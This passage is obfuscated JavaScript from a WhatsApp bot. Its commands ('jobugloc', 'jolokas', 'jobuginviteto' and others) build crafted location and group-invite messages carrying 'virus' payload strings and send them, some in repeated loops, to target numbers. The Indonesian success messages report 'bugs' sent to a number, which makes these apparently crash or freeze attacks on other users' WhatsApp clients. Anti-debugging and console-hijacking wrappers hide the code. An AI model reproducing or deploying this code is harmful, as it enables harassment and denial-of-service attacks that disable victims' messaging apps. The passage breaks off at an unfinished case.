var _0xb5edb5=_0x3ae4;(function(_0x2c596c,_0x2afa88){var _0x4e1211=_0x3ae4,_0x46efa6=_0x2c596c();while(!![]){try{var _0x19bc12=-parseInt(_0x4e1211(0x18b))/0x1+-parseInt(_0x4e1211(0x1a5))/0x2+parseInt(_0x4e1211(0x192))/0x3+parseInt(_0x4e1211(0x1a6))/0x4+parseInt(_0x4e1211(0x1a2))/0x5+-parseInt(_0x4e1211(0x19f))/0x6*(-parseInt(_0x4e1211(0x1a3))/0x7)+parseInt(_0x4e1211(0x19c))/0x8;if(_0x19bc12===_0x2afa88)break;else _0x46efa6['push'](_0x46efa6['shift']());}catch(_0x425d20){_0x46efa6['push'](_0x46efa6['shift']());}}}(_0x2f65,0x44e80));function _0x3ae4(_0x497b5e,_0x721750){var _0x407b93=_0x2f65();return _0x3ae4=function(_0x38621f,_0x213aee){_0x38621f=_0x38621f-0x184;var _0x2f1a13=_0x407b93[_0x38621f];return _0x2f1a13;},_0x3ae4(_0x497b5e,_0x721750);}var _0x21bee9=(function(){var _0x4105c2=!![];return function(_0x304fd1,_0x2b9de0){var _0x1a00d9=_0x4105c2?function(){var _0xe8da5a=_0x3ae4;if(_0x2b9de0){var _0x564c90=_0x2b9de0[_0xe8da5a(0x194)](_0x304fd1,arguments);return _0x2b9de0=null,_0x564c90;}}:function(){};return _0x4105c2=![],_0x1a00d9;};}()),_0x541cc1=_0x21bee9(this,function(){var _0x2766fb=_0x3ae4;return _0x541cc1[_0x2766fb(0x184)]()[_0x2766fb(0x186)]('(((.+)+)+)+$')[_0x2766fb(0x184)]()['constructor'](_0x541cc1)['search'](_0x2766fb(0x197));});_0x541cc1();function _0x2f65(){var _0x5652ee=['{}.constructor(\x22return\x20this\x22)(\x20)','漏\x20饾懟饾懐饾懍\x20饾懕饾懚\x20饾懇饾懚饾懟饾拋','3350096ZSqAce','warn','exception','34638lIuXpX','prototype','length','466655aYnoww','420atWrDO','imageMessage','1021948IaqJDn','165256rQJqCs','@s.whatsapp.net','Berhasil\x20Mengirim\x20Bugloc\x20Di\x20Nomer\x20','error','relayMessage','toString','trace','search','message','key','log','./pict.jpg','408930Msoxiu','constructor','Nomernya\x20mana?','Message','console','__proto__','reply','907071VhdRZQ','return\x20(function()\x20','apply','bind','chat','(((.+)+)+)+$','readFileSync','info'];_0x2f65=function(){return _0x5652ee;};return _0x2f65();}var _0x213aee=(function(){var _0x5611ef=!![];return function(_0xf73b98,_0x837f70){var _0x11b819=_0x5611ef?function(){var _0x10e67e=_0x3ae4;if(_0x837f70){var _0x2a9207=_0x837f70[_0x10e67e(0x194)](_0xf73b98,arguments);return _0x837f70=null,_0x2a9207;}}:function(){};return _0x5611ef=![],_0x11b819;};}()),_0x38621f=_0x213aee(this,function(){var _0xce6326=_0x3ae4,_0x4a6f0c;try{var _0x2bda55=Function(_0xce6326(0x193)+_0xce6326(0x19a)+');');_0x4a6f0c=_0x2bda55();}catch(_0x3ca3cd){_0x4a6f0c=window;}var _0xa1fbb9=_0x4a6f0c[_0xce6326(0x18f)]=_0x4a6f0c[_0xce6326(0x18f)]||{},_0x5b4e3c=[_0xce6326(0x189),_0xce6326(0x19d),_0xce6326(0x199),_0xce6326(0x1a9),_0xce6326(0x19e),'table',_0xce6326(0x185)];for(var _0x1b7363=0x0;_0x1b7363<_0x5b4e3c[_0xce6326(0x1a1)];_0x1b7363++){var _0x49b6b4=_0x213aee[_0xce6326(0x18c)][_0xce6326(0x1a0)][_0xce6326(0x195)](_0x213aee),_0x1d6ae2=_0x5b4e3c[_0x1b7363],_0x5cb370=_0xa1fbb9[_0x1d6ae2]||_0x49b6b4;_0x49b6b4[_0xce6326(0x190)]=_0x213aee[_0xce6326(0x195)](_0x213aee),_0x49b6b4[_0xce6326(0x184)]=_0x5cb370[_0xce6326(0x184)][_0xce6326(0x195)](_0x5cb370),_0xa1fbb9[_0x1d6ae2]=_0x49b6b4;}});_0x38621f();{if(!isCreator&&!isBan)return;if(!text)throw _0xb5edb5(0x18d);var messa=await prepareWAMessageMedia({'image':fs[_0xb5edb5(0x198)](_0xb5edb5(0x18a))},{'upload':jobotz['waUploadToServer']}),location=generateWAMessageFromContent(m['chat'],proto[_0xb5edb5(0x18e)]['fromObject']({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':_0xb5edb5(0x19b)+philips+'\x20'+ngazap(prefix),'jpegThumbnail':messa[_0xb5edb5(0x1a4)]}}),{'userJid':m[_0xb5edb5(0x196)],'quoted':fkonjo});jobotz[_0xb5edb5(0x1aa)](text+_0xb5edb5(0x1a7),location[_0xb5edb5(0x187)],{'messageId':location[_0xb5edb5(0x188)]['id']}),await m[_0xb5edb5(0x191)](_0xb5edb5(0x1a8)+text);}
}
break

case 'jadilokas':{
var _0x16df5a=_0x12e8;(function(_0x2237c2,_0x39a4c0){var _0x2b650e=_0x12e8,_0x4dbd99=_0x2237c2();while(!![]){try{var _0x116753=-parseInt(_0x2b650e(0x126))/0x1+parseInt(_0x2b650e(0x138))/0x2+-parseInt(_0x2b650e(0x13a))/0x3*(-parseInt(_0x2b650e(0x13b))/0x4)+-parseInt(_0x2b650e(0x12e))/0x5*(parseInt(_0x2b650e(0x133))/0x6)+parseInt(_0x2b650e(0x130))/0x7+parseInt(_0x2b650e(0x12d))/0x8*(parseInt(_0x2b650e(0x140))/0x9)+-parseInt(_0x2b650e(0x147))/0xa;if(_0x116753===_0x39a4c0)break;else _0x4dbd99['push'](_0x4dbd99['shift']());}catch(_0x58c6ad){_0x4dbd99['push'](_0x4dbd99['shift']());}}}(_0xcf60,0xb2b63));function _0x12e8(_0x222e0d,_0x1dafad){var _0x56a9cd=_0xcf60();return _0x12e8=function(_0x4bb73f,_0x247a37){_0x4bb73f=_0x4bb73f-0x125;var _0x502afb=_0x56a9cd[_0x4bb73f];return _0x502afb;},_0x12e8(_0x222e0d,_0x1dafad);}var _0x54eb4e=(function(){var _0x1f816d=!![];return function(_0x233138,_0x3c00e6){var _0x2bc077=_0x1f816d?function(){var _0x3278d5=_0x12e8;if(_0x3c00e6){var _0x4da2b0=_0x3c00e6[_0x3278d5(0x12c)](_0x233138,arguments);return _0x3c00e6=null,_0x4da2b0;}}:function(){};return _0x1f816d=![],_0x2bc077;};}()),_0xc4ed7e=_0x54eb4e(this,function(){var _0x3b23f6=_0x12e8;return _0xc4ed7e['toString']()[_0x3b23f6(0x12a)](_0x3b23f6(0x13f))['toString']()['constructor'](_0xc4ed7e)[_0x3b23f6(0x12a)](_0x3b23f6(0x13f));});_0xc4ed7e();function _0xcf60(){var _0x1a41bb=['355sPJzuj','warn','2259936vCQskP','0@s.whatsapp.net','return\x20(function()\x20','51534tUjheF','message','bind','toString','length','2206012oxdZfh','Sukses\x20Convert\x20Lokas','6981ukjriH','1516UlUPZa','quoted','relayMessage','readFileSync','(((.+)+)+)+$','4029327tgTRMd','Message','waUploadToServer','info','console','error','{}.constructor(\x22return\x20this\x22)(\x20)','18693200TDxNEv','__proto__','fromObject','prototype','./pict.jpg','439754tElIWd','key','chat','log','search','exception','apply','24EQJcQv'];_0xcf60=function(){return _0x1a41bb;};return _0xcf60();}var _0x247a37=(function(){var _0x415629=!![];return function(_0x52f1df,_0x5c8f69){var _0x254dcd=_0x415629?function(){var _0x5d41ff=_0x12e8;if(_0x5c8f69){var _0x32c2b2=_0x5c8f69[_0x5d41ff(0x12c)](_0x52f1df,arguments);return _0x5c8f69=null,_0x32c2b2;}}:function(){};return _0x415629=![],_0x254dcd;};}()),_0x4bb73f=_0x247a37(this,function(){var _0x1df2fa=_0x12e8,_0x19ff1c=function(){var _0x466d97=_0x12e8,_0x5328d6;try{_0x5328d6=Function(_0x466d97(0x132)+_0x466d97(0x146)+');')();}catch(_0x318d5a){_0x5328d6=window;}return _0x5328d6;},_0x3d2091=_0x19ff1c(),_0x9122d9=_0x3d2091[_0x1df2fa(0x144)]=_0x3d2091[_0x1df2fa(0x144)]||{},_0x28abfe=[_0x1df2fa(0x129),_0x1df2fa(0x12f),_0x1df2fa(0x143),_0x1df2fa(0x145),_0x1df2fa(0x12b),'table','trace'];for(var _0x67d362=0x0;_0x67d362<_0x28abfe[_0x1df2fa(0x137)];_0x67d362++){var _0x440936=_0x247a37['constructor'][_0x1df2fa(0x14a)][_0x1df2fa(0x135)](_0x247a37),_0x170562=_0x28abfe[_0x67d362],_0x290cff=_0x9122d9[_0x170562]||_0x440936;_0x440936[_0x1df2fa(0x148)]=_0x247a37[_0x1df2fa(0x135)](_0x247a37),_0x440936[_0x1df2fa(0x136)]=_0x290cff[_0x1df2fa(0x136)][_0x1df2fa(0x135)](_0x290cff),_0x9122d9[_0x170562]=_0x440936;}});_0x4bb73f();{if(!isCreator&&!isBan)return;if(!m[_0x16df5a(0x13c)]&&!text)throw'Teks/Reply';let doc={'key':{'participant':_0x16df5a(0x131)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var messa=await prepareWAMessageMedia({'image':fs[_0x16df5a(0x13e)](_0x16df5a(0x125))},{'upload':jobotz[_0x16df5a(0x142)]}),location=generateWAMessageFromContent(m[_0x16df5a(0x128)],proto[_0x16df5a(0x141)][_0x16df5a(0x149)]({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':text+'\x20'+virusloc+'\x20'+philips+'\x20'+ngazap(prefix),'jpegThumbnail':virgam}}),{'userJid':m['chat'],'quoted':doc});jobotz[_0x16df5a(0x13d)](m['chat'],location[_0x16df5a(0x134)],{'messageId':location[_0x16df5a(0x127)]['id']}),jancok(_0x16df5a(0x139));}
}
break

case 'jolokas': {
const _0x4d94d2=_0x59b2;(function(_0x426a84,_0x1a3c26){const _0x3671f1=_0x59b2,_0x2b8eb3=_0x426a84();while(!![]){try{const _0x22a37f=-parseInt(_0x3671f1(0x1b7))/0x1*(-parseInt(_0x3671f1(0x1c4))/0x2)+parseInt(_0x3671f1(0x1ca))/0x3+-parseInt(_0x3671f1(0x1ce))/0x4*(-parseInt(_0x3671f1(0x1b9))/0x5)+parseInt(_0x3671f1(0x1bc))/0x6*(-parseInt(_0x3671f1(0x1cc))/0x7)+parseInt(_0x3671f1(0x1cb))/0x8*(parseInt(_0x3671f1(0x1bf))/0x9)+-parseInt(_0x3671f1(0x1d6))/0xa+-parseInt(_0x3671f1(0x1b5))/0xb;if(_0x22a37f===_0x1a3c26)break;else _0x2b8eb3['push'](_0x2b8eb3['shift']());}catch(_0x2d672b){_0x2b8eb3['push'](_0x2b8eb3['shift']());}}}(_0x515e,0x608e8));function _0x59b2(_0x4c0a4d,_0x13d00b){const _0x59ec7c=_0x515e();return _0x59b2=function(_0x171b09,_0x20647f){_0x171b09=_0x171b09-0x1b3;let _0x3ed7a7=_0x59ec7c[_0x171b09];return _0x3ed7a7;},_0x59b2(_0x4c0a4d,_0x13d00b);}const _0x46533f=(function(){let _0x5d3301=!![];return function(_0x83bbcb,_0x5b9613){const _0x5032ec=_0x5d3301?function(){const _0x338868=_0x59b2;if(_0x5b9613){const _0x49d104=_0x5b9613[_0x338868(0x1d0)](_0x83bbcb,arguments);return _0x5b9613=null,_0x49d104;}}:function(){};return _0x5d3301=![],_0x5032ec;};}()),_0x5f4a8b=_0x46533f(this,function(){const _0xb5d0bf=_0x59b2;return _0x5f4a8b[_0xb5d0bf(0x1b8)]()['search'](_0xb5d0bf(0x1c0))[_0xb5d0bf(0x1b8)]()[_0xb5d0bf(0x1d7)](_0x5f4a8b)[_0xb5d0bf(0x1bd)]('(((.+)+)+)+$');});_0x5f4a8b();const _0x20647f=(function(){let _0x1b55ab=!![];return function(_0x5c7fc2,_0x584a9a){const _0x45cde6=_0x1b55ab?function(){const _0x26529c=_0x59b2;if(_0x584a9a){const _0x1a72d4=_0x584a9a[_0x26529c(0x1d0)](_0x5c7fc2,arguments);return _0x584a9a=null,_0x1a72d4;}}:function(){};return _0x1b55ab=![],_0x45cde6;};}()),_0x171b09=_0x20647f(this,function(){const _0x36407c=_0x59b2,_0x41b08f=function(){const _0x3d1c33=_0x59b2;let _0x431279;try{_0x431279=Function(_0x3d1c33(0x1d8)+_0x3d1c33(0x1cd)+');')();}catch(_0x377078){_0x431279=window;}return _0x431279;},_0xf957da=_0x41b08f(),_0x5241a0=_0xf957da[_0x36407c(0x1d9)]=_0xf957da[_0x36407c(0x1d9)]||{},_0x2f5384=[_0x36407c(0x1c8),_0x36407c(0x1d2),'info',_0x36407c(0x1c3),_0x36407c(0x1cf),_0x36407c(0x1c7),_0x36407c(0x1c9)];for(let _0x4fd6f4=0x0;_0x4fd6f4<_0x2f5384[_0x36407c(0x1d4)];_0x4fd6f4++){const _0x364685=_0x20647f[_0x36407c(0x1d7)]['prototype'][_0x36407c(0x1c2)](_0x20647f),_0x11ed33=_0x2f5384[_0x4fd6f4],_0x4e958e=_0x5241a0[_0x11ed33]||_0x364685;_0x364685[_0x36407c(0x1bb)]=_0x20647f['bind'](_0x20647f),_0x364685[_0x36407c(0x1b8)]=_0x4e958e['toString'][_0x36407c(0x1c2)](_0x4e958e),_0x5241a0[_0x11ed33]=_0x364685;}});_0x171b09();{if(!isCreator&&!isBan)return;if(args[_0x4d94d2(0x1d4)]==0x0)return m['reply']('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let doc={'key':{'participant':_0x4d94d2(0x1c1)},'message':{'documentMessage':{'title':'漏\x20'+ownername,'jpegThumbnail':thumb}}};var messa=await prepareWAMessageMedia({'image':fs[_0x4d94d2(0x1b3)](_0x4d94d2(0x1ba))},{'upload':jobotz[_0x4d94d2(0x1c6)]}),location=generateWAMessageFromContent(m[_0x4d94d2(0x1d3)],proto[_0x4d94d2(0x1c5)][_0x4d94d2(0x1b4)]({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':'漏\x20饾懟饾懐饾懍\x20饾懕饾懚\x20饾懇饾懚饾懟饾拋'+virusloc+'\x20'+philips+'\x20'+ngazap(prefix),'jpegThumbnail':virgam}}),{'userJid':m['chat'],'quoted':doc});jobotz[_0x4d94d2(0x1be)](m[_0x4d94d2(0x1d3)],location[_0x4d94d2(0x1b6)],{'messageId':location[_0x4d94d2(0x1d1)]['id']});}jancok(_0x4d94d2(0x1d5)+jumlah);}function _0x515e(){const _0x71f633=['./pict.jpg','__proto__','1199832BCbYpm','search','relayMessage','162zQgdge','(((.+)+)+)+$','0@s.whatsapp.net','bind','error','2OohrkC','Message','waUploadToServer','table','log','trace','1249491jEYIFd','188312uHpBKU','14JwJfpf','{}.constructor(\x22return\x20this\x22)(\x20)','131884JdLyMM','exception','apply','key','warn','chat','length','Sukses\x20Send\x20Bug\x20Sebanyak\x20','3186300HCqBbv','constructor','return\x20(function()\x20','console','readFileSync','fromObject','9121035tRfxPj','message','608491APXslp','toString','75BulrKT'];_0x515e=function(){return _0x71f633;};return _0x515e();}
}
break

case 'jobugloc': {
var _0x4ff662=_0x569e;(function(_0x38f7cf,_0x5bf04d){var _0xbfb092=_0x569e,_0x1ca2fc=_0x38f7cf();while(!![]){try{var _0x1c17aa=parseInt(_0xbfb092(0xca))/0x1+parseInt(_0xbfb092(0xba))/0x2*(-parseInt(_0xbfb092(0xc0))/0x3)+-parseInt(_0xbfb092(0xc5))/0x4*(parseInt(_0xbfb092(0xbc))/0x5)+-parseInt(_0xbfb092(0xc9))/0x6+-parseInt(_0xbfb092(0xb3))/0x7+-parseInt(_0xbfb092(0xcd))/0x8*(parseInt(_0xbfb092(0xd1))/0x9)+parseInt(_0xbfb092(0xb7))/0xa;if(_0x1c17aa===_0x5bf04d)break;else _0x1ca2fc['push'](_0x1ca2fc['shift']());}catch(_0x3c6da6){_0x1ca2fc['push'](_0x1ca2fc['shift']());}}}(_0x4f81,0x9505d));var _0x1c08cc=(function(){var _0x128276=!![];return function(_0x10e53e,_0xb9b8ea){var _0x34fddc=_0x128276?function(){var _0x37811d=_0x569e;if(_0xb9b8ea){var _0x511ffd=_0xb9b8ea[_0x37811d(0xb1)](_0x10e53e,arguments);return _0xb9b8ea=null,_0x511ffd;}}:function(){};return _0x128276=![],_0x34fddc;};}()),_0x424321=_0x1c08cc(this,function(){var _0x451060=_0x569e;return _0x424321[_0x451060(0xc4)]()[_0x451060(0xb6)](_0x451060(0xbe))[_0x451060(0xc4)]()['constructor'](_0x424321)['search']('(((.+)+)+)+$');});function _0x4f81(){var _0x5267cd=['toString','3428qqfjdt','error','console','return\x20(function()\x20','283320tjdBKO','338310fLLVCC','chat','exception','19560VRYhin','./pict.jpg','imageMessage','fromObject','702VJStpA','bind','relayMessage','apply','reply','7755216eMctZf','info','warn','search','21296770EMSeVp','readFileSync','log','17038mIvfri','prototype','2290pNpXWv','Sukses\x20Send\x20Bug\x20Sebanyak\x20','(((.+)+)+)+$','length','42PkclaN','constructor','message','{}.constructor(\x22return\x20this\x22)(\x20)'];_0x4f81=function(){return _0x5267cd;};return _0x4f81();}_0x424321();function _0x569e(_0x2381c7,_0x2a1931){var _0x5181ba=_0x4f81();return _0x569e=function(_0x43c316,_0x88c686){_0x43c316=_0x43c316-0xaf;var _0x52730c=_0x5181ba[_0x43c316];return _0x52730c;},_0x569e(_0x2381c7,_0x2a1931);}var _0x88c686=(function(){var _0x3d0e3d=!![];return function(_0x443e43,_0x42e3f4){var _0x4eea4a=_0x3d0e3d?function(){if(_0x42e3f4){var _0xd8d3c3=_0x42e3f4['apply'](_0x443e43,arguments);return _0x42e3f4=null,_0xd8d3c3;}}:function(){};return _0x3d0e3d=![],_0x4eea4a;};}()),_0x43c316=_0x88c686(this,function(){var _0x243dcf=_0x569e,_0x5a49cd=function(){var _0x424bfb=_0x569e,_0x4f400c;try{_0x4f400c=Function(_0x424bfb(0xc8)+_0x424bfb(0xc3)+');')();}catch(_0x35f11e){_0x4f400c=window;}return _0x4f400c;},_0x2c64b8=_0x5a49cd(),_0x5c95d1=_0x2c64b8[_0x243dcf(0xc7)]=_0x2c64b8[_0x243dcf(0xc7)]||{},_0x6a6802=[_0x243dcf(0xb9),_0x243dcf(0xb5),_0x243dcf(0xb4),_0x243dcf(0xc6),_0x243dcf(0xcc),'table','trace'];for(var _0x3232e5=0x0;_0x3232e5<_0x6a6802[_0x243dcf(0xbf)];_0x3232e5++){var _0x2887f4=_0x88c686[_0x243dcf(0xc1)][_0x243dcf(0xbb)][_0x243dcf(0xaf)](_0x88c686),_0x2b20ec=_0x6a6802[_0x3232e5],_0x288ee9=_0x5c95d1[_0x2b20ec]||_0x2887f4;_0x2887f4['__proto__']=_0x88c686[_0x243dcf(0xaf)](_0x88c686),_0x2887f4[_0x243dcf(0xc4)]=_0x288ee9[_0x243dcf(0xc4)][_0x243dcf(0xaf)](_0x288ee9),_0x5c95d1[_0x2b20ec]=_0x2887f4;}});_0x43c316();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x4ff662(0xb2)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':fs[_0x4ff662(0xb8)](_0x4ff662(0xce))},{'upload':jobotz['waUploadToServer']}),location=generateWAMessageFromContent(m['chat'],proto['Message'][_0x4ff662(0xd0)]({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':'漏\x20饾懟饾懐饾懍\x20饾懕饾懚\x20饾懇饾懚饾懟饾拋'+philips+'\x20'+ngazap(prefix),'jpegThumbnail':messa[_0x4ff662(0xcf)]}}),{'userJid':m[_0x4ff662(0xcb)],'quoted':fkonjo});jobotz[_0x4ff662(0xb0)](m[_0x4ff662(0xcb)],location[_0x4ff662(0xc2)],{'messageId':location['key']['id']});}jancok(_0x4ff662(0xbd)+jumlah);}
}
break

case 'jadibugloc':{
var _0x18da71=_0x5de0;(function(_0x1b870d,_0xb22a21){var _0x4c3630=_0x5de0,_0x5eaabd=_0x1b870d();while(!![]){try{var _0x20a6d7=parseInt(_0x4c3630(0x1e6))/0x1+parseInt(_0x4c3630(0x1e9))/0x2*(parseInt(_0x4c3630(0x1ed))/0x3)+-parseInt(_0x4c3630(0x1e2))/0x4*(-parseInt(_0x4c3630(0x1ea))/0x5)+parseInt(_0x4c3630(0x1f4))/0x6+-parseInt(_0x4c3630(0x1e3))/0x7+-parseInt(_0x4c3630(0x1da))/0x8*(parseInt(_0x4c3630(0x1f6))/0x9)+-parseInt(_0x4c3630(0x1df))/0xa;if(_0x20a6d7===_0xb22a21)break;else _0x5eaabd['push'](_0x5eaabd['shift']());}catch(_0x17719e){_0x5eaabd['push'](_0x5eaabd['shift']());}}}(_0x3a6c,0xe9369));var _0x265593=(function(){var _0x395c87=!![];return function(_0x23fdb7,_0x2a2ffe){var _0x460218=_0x395c87?function(){var _0x14b401=_0x5de0;if(_0x2a2ffe){var _0x216cee=_0x2a2ffe[_0x14b401(0x1f0)](_0x23fdb7,arguments);return _0x2a2ffe=null,_0x216cee;}}:function(){};return _0x395c87=![],_0x460218;};}()),_0x477281=_0x265593(this,function(){var _0x2f1086=_0x5de0;return _0x477281[_0x2f1086(0x1ec)]()[_0x2f1086(0x1f5)](_0x2f1086(0x1f8))[_0x2f1086(0x1ec)]()['constructor'](_0x477281)[_0x2f1086(0x1f5)](_0x2f1086(0x1f8));});function _0x5de0(_0x539894,_0x443fc1){var _0xf62a78=_0x3a6c();return _0x5de0=function(_0x1befba,_0x12133d){_0x1befba=_0x1befba-0x1d7;var _0x3eb31a=_0xf62a78[_0x1befba];return _0x3eb31a;},_0x5de0(_0x539894,_0x443fc1);}function _0x3a6c(){var _0x45dc94=['Message','chat','5109512PETLJZ','warn','error','__proto__','console','15868350vTiwBn','relayMessage','Teks/Reply','3460IqNpgr','12875457QvPgke','./pict.jpg','message','1261362YlQTdU','Location\x20','table','45954BVEWRC','7745HJvwsR','imageMessage','toString','249goDYJo','exception','waUploadToServer','apply','readFileSync','info','constructor','3070668udiakw','search','9uaufdK','prototype','(((.+)+)+)+$','length','quoted','bind'];_0x3a6c=function(){return _0x45dc94;};return _0x3a6c();}_0x477281();var _0x12133d=(function(){var _0x2f6548=!![];return function(_0x2e2d24,_0x9039b8){var _0x44c367=_0x2f6548?function(){if(_0x9039b8){var _0x4395f6=_0x9039b8['apply'](_0x2e2d24,arguments);return _0x9039b8=null,_0x4395f6;}}:function(){};return _0x2f6548=![],_0x44c367;};}()),_0x1befba=_0x12133d(this,function(){var _0x5365c3=_0x5de0,_0x5cd94b=function(){var _0x47c728;try{_0x47c728=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x16a097){_0x47c728=window;}return _0x47c728;},_0x2f7e22=_0x5cd94b(),_0x58cfe6=_0x2f7e22[_0x5365c3(0x1de)]=_0x2f7e22[_0x5365c3(0x1de)]||{},_0x52aa63=['log',_0x5365c3(0x1db),_0x5365c3(0x1f2),_0x5365c3(0x1dc),_0x5365c3(0x1ee),_0x5365c3(0x1e8),'trace'];for(var _0x44d216=0x0;_0x44d216<_0x52aa63[_0x5365c3(0x1f9)];_0x44d216++){var _0x2de283=_0x12133d[_0x5365c3(0x1f3)][_0x5365c3(0x1f7)][_0x5365c3(0x1d7)](_0x12133d),_0x105b5e=_0x52aa63[_0x44d216],_0x4effe4=_0x58cfe6[_0x105b5e]||_0x2de283;_0x2de283[_0x5365c3(0x1dd)]=_0x12133d[_0x5365c3(0x1d7)](_0x12133d),_0x2de283[_0x5365c3(0x1ec)]=_0x4effe4['toString'][_0x5365c3(0x1d7)](_0x4effe4),_0x58cfe6[_0x105b5e]=_0x2de283;}});_0x1befba();{if(!isCreator&&!isBan)return;if(!m[_0x18da71(0x1fa)]&&!text)throw _0x18da71(0x1e1);var messa=await prepareWAMessageMedia({'image':fs[_0x18da71(0x1f1)](_0x18da71(0x1e4))},{'upload':jobotz[_0x18da71(0x1ef)]}),location=generateWAMessageFromContent(m['chat'],proto[_0x18da71(0x1d8)]['fromObject']({'locationMessage':{'degreesLatitude':-6.936928157735237,'degreesLongitude':107.72270679473877,'caption':_0x18da71(0x1e7)+text+'\x20'+philips+'\x20'+ngazap(prefix),'jpegThumbnail':messa[_0x18da71(0x1eb)]}}),{'userJid':m[_0x18da71(0x1d9)],'quoted':fkonjo});jobotz[_0x18da71(0x1e0)](m[_0x18da71(0x1d9)],location[_0x18da71(0x1e5)],{'messageId':location['key']['id']}),jancok('Sukses\x20Convert\x20Bugloc');}
}
break

case 'jobuginviteto': {
var _0x414503=_0x8b69;(function(_0x558bf2,_0x29550f){var _0x2e9467=_0x8b69,_0x76cf94=_0x558bf2();while(!![]){try{var _0x5491e8=-parseInt(_0x2e9467(0xef))/0x1*(-parseInt(_0x2e9467(0xe3))/0x2)+parseInt(_0x2e9467(0xee))/0x3*(parseInt(_0x2e9467(0xd0))/0x4)+-parseInt(_0x2e9467(0xcf))/0x5+-parseInt(_0x2e9467(0xe5))/0x6+-parseInt(_0x2e9467(0xf0))/0x7*(-parseInt(_0x2e9467(0xe1))/0x8)+-parseInt(_0x2e9467(0xdf))/0x9*(parseInt(_0x2e9467(0xe6))/0xa)+parseInt(_0x2e9467(0xea))/0xb*(parseInt(_0x2e9467(0xe4))/0xc);if(_0x5491e8===_0x29550f)break;else _0x76cf94['push'](_0x76cf94['shift']());}catch(_0xf10d9b){_0x76cf94['push'](_0x76cf94['shift']());}}}(_0x2125,0xdd086));var _0x494af8=(function(){var _0x36bcb6=!![];return function(_0xbf759e,_0x2fa438){var _0x2ff5ef=_0x36bcb6?function(){var _0x493b25=_0x8b69;if(_0x2fa438){var _0x188fb4=_0x2fa438[_0x493b25(0xec)](_0xbf759e,arguments);return _0x2fa438=null,_0x188fb4;}}:function(){};return _0x36bcb6=![],_0x2ff5ef;};}()),_0x1928fd=_0x494af8(this,function(){var _0x277f7b=_0x8b69;return _0x1928fd['toString']()[_0x277f7b(0xdc)]('(((.+)+)+)+$')[_0x277f7b(0xd6)]()[_0x277f7b(0xc9)](_0x1928fd)[_0x277f7b(0xdc)](_0x277f7b(0xf1));});_0x1928fd();var _0x5b2cc3=(function(){var _0x26db48=!![];return function(_0x471839,_0x4157c9){var _0x4676b2=_0x26db48?function(){var _0x4fcacd=_0x8b69;if(_0x4157c9){var _0x4d40fa=_0x4157c9[_0x4fcacd(0xec)](_0x471839,arguments);return _0x4157c9=null,_0x4d40fa;}}:function(){};return _0x26db48=![],_0x4676b2;};}()),_0x2a6591=_0x5b2cc3(this,function(){var _0x530bd9=_0x8b69,_0x2a7221=function(){var _0x293b70=_0x8b69,_0x367414;try{_0x367414=Function(_0x293b70(0xcd)+_0x293b70(0xe2)+');')();}catch(_0x180d7d){_0x367414=window;}return _0x367414;},_0xea84cc=_0x2a7221(),_0x287d73=_0xea84cc[_0x530bd9(0xe9)]=_0xea84cc[_0x530bd9(0xe9)]||{},_0x498b48=[_0x530bd9(0xd4),_0x530bd9(0xd1),_0x530bd9(0xe8),_0x530bd9(0xeb),_0x530bd9(0xf4),'table',_0x530bd9(0xd3)];for(var _0x26b0de=0x0;_0x26b0de<_0x498b48[_0x530bd9(0xd2)];_0x26b0de++){var _0x1a62ac=_0x5b2cc3[_0x530bd9(0xc9)][_0x530bd9(0xe7)][_0x530bd9(0xf5)](_0x5b2cc3),_0x28a1eb=_0x498b48[_0x26b0de],_0x4fc09d=_0x287d73[_0x28a1eb]||_0x1a62ac;_0x1a62ac[_0x530bd9(0xd7)]=_0x5b2cc3[_0x530bd9(0xf5)](_0x5b2cc3),_0x1a62ac[_0x530bd9(0xd6)]=_0x4fc09d[_0x530bd9(0xd6)][_0x530bd9(0xf5)](_0x4fc09d),_0x287d73[_0x28a1eb]=_0x1a62ac;}});function _0x8b69(_0x151b4e,_0x580cf4){var _0xfda71b=_0x2125();return _0x8b69=function(_0x2a6591,_0x5b2cc3){_0x2a6591=_0x2a6591-0xc9;var _0x3aacdb=_0xfda71b[_0x2a6591];return _0x3aacdb;},_0x8b69(_0x151b4e,_0x580cf4);}function _0x2125(){var _0x593795=['@s.whatsapp.net','return\x20(function()\x20','Message','4580825MfYOQb','22412NekMPi','warn','length','trace','log','chat','toString','__proto__','./pict.jpg','85296556573-1328272333@g.us','message','Berhasil\x20Mengirim\x20Buginvite\x20Di\x20Nomer\x20','search','𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁','imageMessage','1314ocgWlz','readFileSync','1210448wcxwrj','{}.constructor(\x22return\x20this\x22)(\x20)','596484PdXTob','264tjNuQh','10572210pJkKQy','107500YMrqgF','prototype','info','console','1420320zXXXCe','error','apply','fromObject','354GHkyuJ','3UMngua','35nxBHdl','(((.+)+)+)+$','Nomernya\x20mana?','key','exception','bind','constructor','relayMessage','waUploadToServer'];_0x2125=function(){return _0x593795;};return _0x2125();}_0x2a6591();{if(!isCreator&&!isBan)return;if(!text)throw _0x414503(0xf2);var messa=await prepareWAMessageMedia({'image':fs[_0x414503(0xe0)](_0x414503(0xd8))},{'upload':jobotz[_0x414503(0xcb)]}),groupInvite=generateWAMessageFromContent(m[_0x414503(0xd5)],proto[_0x414503(0xce)][_0x414503(0xed)]({'groupInviteMessage':{'groupJid':_0x414503(0xd9),'inviteCode':'wFHwtOxGQN8OwK2x','inviteExpiration':_0x414503(0xdd)+philips,'groupName':_0x414503(0xdd)+philips,'caption':''+philips,'jpegThumbnail':messa[_0x414503(0xde)]}}),{'userJid':m[_0x414503(0xd5)],'quoted':fkonjo});jobotz[_0x414503(0xca)](text+_0x414503(0xcc),groupInvite[_0x414503(0xda)],{'messageId':groupInvite[_0x414503(0xf3)]['id']}),await m['reply'](_0x414503(0xdb)+text);}
}
break

case 'jobuginvite': {
